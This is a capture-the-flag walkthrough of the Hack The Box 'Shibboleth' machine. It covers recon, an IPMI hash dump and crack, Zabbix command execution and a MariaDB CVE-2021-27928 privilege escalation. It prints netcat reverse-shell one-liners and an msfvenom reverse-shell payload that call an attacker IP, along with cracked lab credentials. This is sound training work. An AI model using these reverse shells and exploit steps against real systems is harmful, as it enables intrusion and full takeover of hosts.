# Shibboleth Machine(10.10.11.124)

## Info:

This was a medium linux box which aimed at teaching players about zabbix, mariadb command injection and password resuse vulnerability.


![Shibboleth](https://user-images.githubusercontent.com/79413473/161095761-dc02d183-18a6-4fa5-bc8a-08a6f27eb2ec.png)

## Recon:

Starting with port scan, only one port is shown open, we can always run full port scan in background.

```
rustscan -a 10.10.11.124 -u 5000`

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

### UDP port scan

As rustscan supports only TCP we will use nmap for UDP scanning.

```
sudo nmap -sU 10.10.11.124:

PORT    STATE SERVICE
623/udp open  asf-rmcp
```
This port is used in remote remote monitoring systems. Running better nmap scan on it

![Screenshot from 2022-03-31 22-06-11](https://user-images.githubusercontent.com/79413473/161105966-1b7fea0a-3e79-45d2-96e7-ad7a30c0bbc7.png)

Let's add **shibboleth.htb** to our hosts file and also run vhost scanning in background.

![Screenshot from 2022-03-31 21-30-16](https://user-images.githubusercontent.com/79413473/161099030-18fc5f83-b9bb-49bc-816b-a9b4992e34a4.png)

```
ffuf -u http://shibboleth.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.shibboleth.htb" -fc 302
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 302
________________________________________________

monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 303ms]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 425ms]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 418ms]
:: Progress: [4989/4989] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```

Let's add these hosts to our */etc/hosts* file as well.

Each one of them have same landing page. **zabbix.shibboleth.htb**, **monitor.shibboleth.htb**, **monitoring.shibboleth.htb**.

![Screenshot from 2022-03-31 22-09-38](https://user-images.githubusercontent.com/79413473/161137287-38e76465-fc8e-4a01-b86c-e54e8ddd5fd1.png)

Where google describe **zabbix** as *Zabbix is an open-source software tool to monitor IT infrastructure such as networks, servers, virtual machines, and cloud services. Zabbix collects and displays basic metrics.*

Directory and file fuzzing doesn't reveal much other than common files like *index.html*, *assets*, *contact* etc.


## Foothold: IPMI hash dump

As hacktricks [says](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval), we can retrieve default user's hashed password using metasploit module *scanner/ipmi/ipmi_dumphashes*

![Screenshot from 2022-03-31 22-33-02](https://user-images.githubusercontent.com/79413473/161110610-5ecbacde-5aff-49bb-bd4e-19f6ba7e09a0.png)

It dumps the **Administrator** user's hash let's crack that with hashcat. You can specify output format in metasploit as well. Manually you can put just hash without username in a file. i cracked using hashcat on google [colab](https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ipynb)

```
!hashcat/hashcat "01c82d308205000004872b9f98e0052b521984be95a86bd5a70c5d5a69e7ab29e42e1849a8a359b1a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:4ae0c52b06606c6407c0a16a0bf117ffc9d9e6a1" wordlists/rockyou.txt
```
It tells the password, 

![Screenshot from 2022-03-31 22-42-26](https://user-images.githubusercontent.com/79413473/161112172-70999d74-69e0-4d37-a16b-dbbf63520403.png)

let's login to zabbix using that.

![Screenshot from 2022-03-31 22-44-42](https://user-images.githubusercontent.com/79413473/161112500-10281b18-00c4-456e-9b0d-7d7a1d23d035.png)

### getting reverse shell from zabbix:

*PS: As of today(31 March 2022) while writing this blog , i searched for zabbix version 5.0.17 exploit and there is a Authenticated [CVE](https://www.exploit-db.com/exploits/50816) which works pretty well. But that is not the intended path as box was released in 2021 and this exploit is dropped on March 9th 2022.*

![Screenshot from 2022-03-31 23-44-33](https://user-images.githubusercontent.com/79413473/161122673-2fb2f1e9-7fc2-436e-97f8-e945c0fe9ca4.png)

I remember first time i did this machine i searched how to execute commands with zabbix and found [this](https://www.youtube.com/watch?v=Oha53b00vR0) video. Basically using zabbix agent we can execute commands on system.

Got to hosts and create a new item 

![2022-03-31_23-26](https://user-images.githubusercontent.com/79413473/161119613-b41399b8-1c8d-4ef3-b2f6-20bb3c56aa2c.png)

![2022-03-31_23-27](https://user-images.githubusercontent.com/79413473/161119731-ff91f6b8-553e-45e8-aeb5-e6b2c08e0e85.png)

And using **system.run[]** in zabbix agent we can execute arbitrary command. Reading little bit of docs we can find it runs in 2 modes wait & nowait, where wait is default.

Create items with wait mode

![2022-03-31_23-31](https://user-images.githubusercontent.com/79413473/161124408-4b721be6-380e-42af-9fec-8dc8475174f7.png)

```
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 8083 >/tmp/f]
```
and i got the shell and it dies instantly.

![Screenshot from 2022-03-31 23-38-18](https://user-images.githubusercontent.com/79413473/161121607-5e58b195-daef-4723-b3f1-76b4f27552e2.png)

While asking for help earlier i learned that you can start a process in a new session, which won't be killed by zabbix, using **setsid** command.

```
setsid rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 8083 >/tmp/f
``` 
setsid would keep your shell alive. But let's try this with nowait once.

![Screenshot from 2022-03-31 23-41-15](https://user-images.githubusercontent.com/79413473/161122268-b898a475-e11c-4789-bba3-20720556fd83.png)

But same problem persist. So let's switch  to setsid payload and it works successfully.

![Screenshot from 2022-03-31 23-46-35](https://user-images.githubusercontent.com/79413473/161122960-18c076ed-f682-41e6-8f67-7890f2069f91.png)

Let's upgrade to tty shell 

![Screenshot from 2022-03-31 23-47-27](https://user-images.githubusercontent.com/79413473/161123167-f675893e-32f4-4aec-84de-d66a346d4678.png)

Reading apache2 conf file, we can see zabbix root directory is **/usr/share/zabbix**

![Screenshot from 2022-03-31 23-56-44](https://user-images.githubusercontent.com/79413473/161124692-f9bfa4e3-673f-48b5-93e8-7adaa8669e08.png)

Also note that monitor & monitoring vhost are just alias for zabbix only.

## Lateral Movement: password reuse

I started enumerating the box with linpeas, and found some interesting path like **/etc/zabbix** and **/var/log/zabbix** which has content related to zabbix. I started hunting password for zabbix database but couldn't find it as it isn't in **/usr/share/zabbix**. And conf files in **/etc/zabbix** aren't redable by zabbix user which can have password as suggested by few google searches.

But thing was that we already have a password which we cracked earlier for **Administrator** user. Let's try that 

```
su ipmi-svc
Password: ilovepumkinpie1
```

![Screenshot from 2022-04-01 00-29-22](https://user-images.githubusercontent.com/79413473/161129623-05047656-fa2e-4d5c-bc81-9827ddd614c3.png)


## Privilege Escaltion: CVE-2021-27928 exploit

Now from **/etc/zabbix/zabbix_server.conf** file we can also read database password

```
DBUser=zabbix
DBPassword=bloooarskybluh
```
Let's login using these creds, and it tells mariadb version

![Screenshot from 2022-04-01 00-39-07](https://user-images.githubusercontent.com/79413473/161131241-b9ad41e4-9f44-4279-8ccc-918f99a4cbc5.png)

Google this version no. and it is vulnerable to CVE-2021-27928. Accoridng to [description](https://nvd.nist.gov/vuln/detail/CVE-2021-27928) user can
inject command by modifying *wsrep_provider* [library](https://mariadb.com/kb/en/galera-cluster-system-variables/#wsrep_provider).  let's follow [these](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html) steps.

Create a malicious shared library file using msfvenom 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8084 -f elf-so -o exploit.so
```
Transfer this to machine using python webserver. I like to use **updog**

![Screenshot from 2022-04-01 00-53-43](https://user-images.githubusercontent.com/79413473/161133488-7fffd189-c535-4d27-ac70-14b3dec837e9.png)

Execute the payload by specifying the **-e** flag , by default host(-h) is set to localhost.

```
mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/tmp/exploit.so";'
```
![Screenshot from 2022-04-01 00-57-05](https://user-images.githubusercontent.com/79413473/161133971-d298c1c3-69ee-4915-8efc-ef8262628e49.png)

on my listener, 

![Screenshot from 2022-04-01 00-57-34](https://user-images.githubusercontent.com/79413473/161134032-70b65166-e0b7-4112-8cef-7b0e6d50f225.png)

As mariadb was running as root(uid=0) , that's why we get our shell in root's context

![Screenshot from 2022-04-01 01-14-40](https://user-images.githubusercontent.com/79413473/161136549-e6a607a3-ab3f-42d3-828e-1755233804ca.png)

And that's how we get root on this machine.

Thanks for reading, feedbacks are welcome and don't forget to cleanup your scripts and exploits before leaving the machine.

Twitter: [Avinashkroy](https://twitter.com/Avinashkroy)
